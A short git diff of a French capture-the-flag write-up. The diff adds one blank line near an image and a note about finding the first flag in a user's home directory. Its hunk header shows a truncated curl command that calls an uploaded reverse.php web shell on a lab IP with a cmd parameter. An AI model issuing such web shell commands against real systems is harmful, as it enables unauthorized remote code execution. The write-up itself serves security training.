@@ -250,6 +250,7 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 ![image](https://github.com/user-attachments/assets/41e823df-f8f3-4b7c-b767-7e1cc1d25238)
 
 - **Découverte du premier flag** : J'ai trouvé le premier flag dans `/home/james/user.txt`.
+
 ![image](https://github.com/user-attachments/assets/1ab4938a-cb6a-4a3a-889c-5c0fa0b8b83f)
 
 
